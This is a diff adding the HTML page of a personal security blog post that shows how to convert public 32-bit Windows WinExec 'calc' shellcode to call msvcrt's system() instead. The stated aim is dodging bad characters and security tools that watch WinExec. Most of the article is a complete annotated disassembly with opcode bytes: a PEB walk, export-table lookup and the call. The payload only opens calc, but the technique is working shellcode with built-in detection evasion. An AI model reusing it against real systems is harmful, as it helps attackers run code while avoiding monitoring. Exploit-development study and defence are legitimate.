@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Benjamin Lim">
+  <meta name="description" content="I have found an interesting method to convert WinExec shellcode. This may be useful if WinExec cannot be used because the characters WinE are bad...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="../theme/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="../theme/css/pygments.css" type="text/css" media="all">
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+
+  
+ 
+
+  <link href="https://limbenjamin.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="limbenjamin Full Atom Feed" />
+
+<meta name="keywords" content="limbenjamin, Security">
+
+<meta property="og:title" content="Converting WinExec shellcode">
+<meta property="og:type" content="website">
+<meta property="og:image" content="http://limbenjamin.com/media/chip.png"/>
+<meta property="og:image:secure_url" content="https://limbenjamin.com/media/chip.png"/>
+<meta property="og:site_name" content="https://limbenjamin.com">
+<meta property="og:description" content="I have found an interesting method to convert WinExec shellcode. This may be useful if WinExec cannot be used because the characters WinE are bad characters or if there are security solutions monitoring for its execution. This method requires msvcrt.dll to be loaded as it uses the system call …">
+<meta property="og:url" content="https://limbenjamin.com/articles/converting-winexec-shellcode.html">
+<meta property="fb:admins" content="557193263"/>
+<meta property="fb:app_id" content="520142688161055"/>
+
+
+  <title>Converting WinExec shellcode</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-40858819-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="/index.html" >Index
+<i class="fa  fa-lg"></i></a></li>
+                <li class="menu-item"><a href="/pages/about-me.html" >About me
+<i class="fa  fa-lg"></i></a></li>
+                <li class="menu-item"><a href="/files/cv.html" >Résumé
+<i class="fa  fa-lg"></i></a></li>
+                <li class="menu-item"><a href="/gpg.txt" >GPG Key
+<i class="fa  fa-lg"></i></a></li>
+                <li class="menu-item"><a href="/pages/projects.html" >Projects
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://limbenjamin.com/feeds/all.atom.xml" title="Feed" >
+<i class="fa fa-rss fa-lg"></i></a>
+                <a href="#mail" title="Email" >
+<i class="fa fa-envelope fa-lg"></i></a>
+                <a href="https://sg.linkedin.com/in/1imbenjamin" title="LinkedIn" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://github.com/limbenjamin" title="GitHub" >
+<i class="fa fa-github fa-lg"></i></a>
+                <a href="https://security.stackexchange.com/users/53583/limbenjamin" title="StackExchange" >
+<i class="fa fa-stack-exchange fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+    <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href=".."><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"   width="233.45px" height="184.71px" viewBox="0 0 233.45 184.71" enable-background="new 0 0 233.45 184.71" xml:space="preserve"><ellipse id="c1" fill="none" cx="60.2" cy="57.5" rx="3.6" ry="3.1"/><ellipse id="c2" fill="none" cx="56.4" cy="103.3" rx="3.3" ry="3.2"/><ellipse id="c3" fill="none" cx="99.8" cy="121.7" rx="3.3" ry="3.1"/><ellipse id="c4" fill="none" cx="151.8" cy="124.9" rx="3.3" ry="2.8"/><ellipse id="c5" fill="none" cx="172.5" cy="87" rx="3.8" ry="2.9"/><ellipse id="c6" fill="none" cx="176.8" cy="41.1" rx="3.5" ry="3.1"/><ellipse id="c7" fill="none" cx="132.8" cy="23.3" rx="3.4" ry="3.2"/><ellipse id="c8" fill="none" cx="81.3" cy="19.8" rx="3.7" ry="3.4"/><path id="path4" fill="#FFF" stroke="#C4E6FC" stroke-width="12" stroke-miterlimit="10" d="M86 58l10-8s10-3 11-1c1 1-7 7-7 7L88 67v4c1 1 2 3 3 2l21-18 10-5h7L89 85l1 4 2 4c3 0 42-38 46-41h4l2 4-1 3-38 33-2 3 5 2 5-1c8-6 20-25 30-25l1 2 1 1-1 4s-19 12-17 18l5 1 4-2 6-4 5-4"/>    <path id="path3" fill="none" stroke="#0e94ec" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M114 85l-7 1-2-8h-2l11-1-12-10 13 2-7-6 8 1-7-5h3l5 2 6-2 2 5 5 3-9 3 7 1-8 4 9 2 1 3h-6l-4 1v4l3 2 4-3"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M64 139v15c0 5 3 8 7 8 5 1 9-2 10-6s-1-7-7-9l-7 2M154 163c-1-4 1-8-1-13-2-2-6-3-10-3-4 1-7 7-5 10 2 5 8 7 12 5l3-3"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M116 15c2 10 0 19 1 29M117 101c-1 9 1 19-1 29M183 72h-34M84 72H52"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M131 147v17c1 4-2 6-6 5M101 160c-6 3-9 3-14-2v-7c2-3 6-5 10-4s6 4 7 7l-16 1M15 140v23"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 87c-6-1-11 0-14 5l-11 8c1 3 1 6-3 7-3-2-3-2-3-6h6M133 101v7l16 14M174 44c4 1 4 1 7-2l-3-4c-5 0-6 1-4 6l-12 10c-4 4-8 5-13 4M85 23l8 7c6 4 7 9 7 14M85 49c-1 10 0 19 1 29v15c0 4 3 6 8 6l22 1 25-1"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M110 163v-7c0-6 0-7 7-9 6 0 8 4 7 8v8"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 23c0-2 2-4 0-6-3-1-5-1-7 2 1 4 3 5 7 4"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M175 150c2-2 5-4 9-3 4 2 5 5 5 8s1 5-1 8M43 150c3-2 5-4 9-3 5 2 5 5 5 8v8M204 150c2-2 5-3 8-3 9 3 5 10 6 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M100 101v16M133 27c-2 0-3-1-4-3 0-2 1-4 5-4 2 0 2 2 3 4-4 2-4 6-4 10v10M64 58c0 2-1 3-3 3-3 0-4-2-5-3l4-4 1 1c4 4 9 3 13 3h10M90 47l4-1h46s4 0 7 5v13a425 425 0 01-1 34"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M196 147v16M22 147c0 5-1 10 1 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M106 82c-3-1-4 1-4 3 1 3 3 5 7 5 3 1 5-1 7-2M131 73c5 4 6 7 2 10l-3 3c-1 4-5 5-9 4-4 0-5-3-5-6l1-18M121 62l6-1v-6c-4-1-7-1-10 2M128 61c8 3 9 6 4 12M173 84c5 2 5 3 0 6-3 0-3-2-5-3 0 0 2-3 4-3M116 60c2-4-1-6-5-5-4 0-7 1-6 6"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M43 163v-9c0-2 0-5-3-6s-6-1-9 1l-2 2c1 4-1 8 1 12M175 163v-9c0-2 0-5-4-6-3-1-6-1-8 1l-2 2v12M203 147v16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M108 101c0 3 1 6-1 9M125 34v10M84 65H73M84 80H73M109 34l-1 10M99 118c-3 1-3 3-2 5s3 2 5 1c2-2 2-5-2-6M106 61c-9 2-10 5-6 11M125 101v7M104 71c-8 4-8 8-2 13M150 122c-3 3-3 3 1 6 3 0 4-1 5-3-1-3-3-3-5-3M149 65h12M150 81h11M169 87h-19"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M22 144v-1M132 144v-1M196 144v-1"/></svg></a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="../tag/coding.html" >Coding (12)</a> &#124; 
+                <a href="../tag/data.html" >Data (9)</a> &#124; 
+                <a href="../tag/nus.html" >NUS (3)</a> &#124; 
+                <a href="../tag/security.html" >Security (115)</a> &#124; 
+                <a href="../tag/server.html" >Server (26)</a> &#124; 
+                <a href="../tag/untagged.html" >Untagged (16)</a> &#124; 
+                <a href="../archives.html" >Archives (164)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2021-12-15 12:24:00+08:00">Dec 15, 2021</time></span>
+        <h1 class="entry-title-single-page"><a href="../articles/converting-winexec-shellcode.html">Converting WinExec shellcode</a></h1>
+      </header><!-- .entry-header -->
+      <div class="entry-content">
+        <p>I have found an interesting method to convert <code>WinExec</code> shellcode. This may be useful if <code>WinExec</code> cannot be used because the characters <code>WinE</code> are bad characters or if there are security solutions monitoring for its execution. This method requires <code>msvcrt.dll</code> to be loaded as it uses the <code>system</code> call in place of <code>WinExec</code>. Both methods take in similar parameters so this can be achieved with only a few bytes of code change.  </p>
+<p>As an example, I will be using this <a href="https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/w32-exec-calc-shellcode.asm">32bit WinExec calc shellcode</a>. Credits to Skylined and Peter Ferrie for the original shellcode and the extremely detailed comments. As you can observe, we saved 1 byte with uCmdShow and inserted only 6 more bytes for the entire conversion. Depending on the DLL load order for your binary, it may take slightly more or less bytes to traverse the linked list to get to <code>msvcrt</code>.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>0:  31 d2                   xor    edx,edx                          ; EDX = 0
+2:  52                      push   edx                              ; Stack = 0
+3:  68 63 61 6c 63          push   0x636c6163                       ; Stack = &quot;calc&quot;, 0
+8:  54                      push   esp
+9:  59                      pop    ecx                              ; ECX = &amp;(&quot;calc&quot;)
+a:  52                      push   edx                              ; CODE REMOVED HERE - We don&#39;t need uCmdShow parameter for system method
+b:  51                      push   ecx                              ; Stack = &amp;(&quot;calc&quot;), &quot;calc&quot;, 0
+c:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]      ; ESI = [TEB + 0x30] = PEB
+10: 8b 76 0c                mov    esi,DWORD PTR [esi+0xc]          ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
+13: 8b 76 0c                mov    esi,DWORD PTR [esi+0xc]          ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
+16: ad                      lods   eax,DWORD PTR ds:[esi]           ; EAX = InLoadOrder[1] (ntdll)
+17: 8b 30                   mov    esi,DWORD PTR [eax]              ; ESI = InLoadOrder[2] (kernel32)
+19: 8b 36                   mov    esi,DWORD PTR [esi]              ; CODE INSERTED HERE - ESI = InLoadOrder[3] (aaaa)
+1b: 8b 36                   mov    esi,DWORD PTR [esi]              ; CODE INSERTED HERE - ESI = InLoadOrder[4] (bbbb)
+1d: 8b 36                   mov    esi,DWORD PTR [esi]              ; CODE INSERTED HERE - ESI = InLoadOrder[5] (msvcrt)
+1f: 8b 7e 18                mov    edi,DWORD PTR [esi+0x18]         ; EDI = [InLoadOrder[5] + 0x18] = msvcrt DllBase
+22: 8b 5f 3c                mov    ebx,DWORD PTR [edi+0x3c]         ; EBX = [msvcrt + 0x3C] = offset(PE header)
+25: 8b 5c 1f 78             mov    ebx,DWORD PTR [edi+ebx*1+0x78]   ; EBX = [PE32 optional header + offset(PE32 export table offset)] = offset(export table)
+29: 8b 74 1f 20             mov    esi,DWORD PTR [edi+ebx*1+0x20]   ; ESI = [msvcrt + offset(export table) + 0x20] = offset(names table)
+2d: 01 fe                   add    esi,edi                          ; ESI = msvcrt + offset(names table) = &amp;(names table)
+2f: 8b 54 1f 24             mov    edx,DWORD PTR [edi+ebx*1+0x24]   ; EDX = [msvcrt + offset(export table) + 0x24] = offset(ordinals table)
+33: 0f b7 2c 17             movzx  ebp,WORD PTR [edi+edx*1]         ; EBP = [msvcrt + offset(ordinals table) + offset] = function ordinal
+37: 42                      inc    edx
+38: 42                      inc    edx                              ; EDX = offset += 2
+39: ad                      lods   eax,DWORD PTR ds:[esi]           ; EAX = &amp;(names table[function number]) = offset(function name)
+3a: 81 3c 07 73 79 73 74    cmp    DWORD PTR [edi+eax*1],0x74737973 ; CODE CHANGED HERE - Change WinE to syst
+41: 75 f0                   jne    0x33
+43: 8b 74 1f 1c             mov    esi,DWORD PTR [edi+ebx*1+0x1c]   ; ESI = [msvcrt + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
+47: 01 fe                   add    esi,edi                          ; ESI = msvcrt + offset(address table) = &amp;(address table)
+49: 03 3c ae                add    edi,DWORD PTR [esi+ebp*4]        ; EDI = msvcrt + [&amp;(address table)[system ordinal]] = offset(system) = &amp;(system)
+4c: ff d7                   call   edi                              ; system(&amp;(&quot;calc&quot;));
+</code></pre></div>
+</td></tr></table>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="../tag/security.html">Security</a>        <br />
+        <div class="similararticleline"></div>
+        <h2>Similar Articles</h2>
+          <div class="similararticlerow">
+              <blockquote class="similar_posts">
+              <a href="../articles/slae64-7-crypters.html"><b>SLAE64 #7 - Crypters
+              (99% Similar) - </b>
+              Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about. Encryptor. ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/slae64-4-sse42-crc32c-encoder.html"><b>SLAE64 #4 - SSE4.2 CRC32C Encoder
+              (98% Similar) - </b>
+              I decided to do something special for the custom encoder shellcode. I used the Intel SSE4.2 CRC32C function to encode the shellcode. CRC32 is a hash function, not an encoding function, so in ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
+              (96% Similar) - </b>
+              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
+              (95% Similar) - </b>
+              I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
+              </blockquote>
+          </div>
+      </div>
+      <br />
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+  <div id="mail" class="overlay">
+    <div class="popup">
+      <a class="close" href="#">&times;</a>
+      <div id="popup_content">
+      </div>
+    </div>
+  </div>
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="../pages/privacy-policy-disclaimer">Privacy & Disclaimer</a> | 
+                    <a href="../feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="../sitemap.xml">Sitemap</a><br />
+                    This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
+                    Page generated on Sun Aug 14 18:39:56 2022<br />
+                    &copy; 2012-2022 <a href="..">Benjamin Lim</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+  <script type="text/javascript">
+    var _paq = _paq || [];
+    _paq.push(['trackPageView']);
+    _paq.push(['enableLinkTracking']);
+    (function() {
+      var u="//limbenjamin.com/a/";
+      _paq.push(['setTrackerUrl', u+'js/']);
+      _paq.push(['setSiteId', 1]);
+      var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+      g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'js/a.js'; s.parentNode.insertBefore(g,s);
+    })();
+  </script>
+  <script type="text/javascript" src="../theme/js/functions.min.js"></script>
+  <noscript><p><img src="//limbenjamin.com/a/a.php?idsite=1" style="border:0;" alt="" /></p></noscript>
+
+
+</body>
+</html>
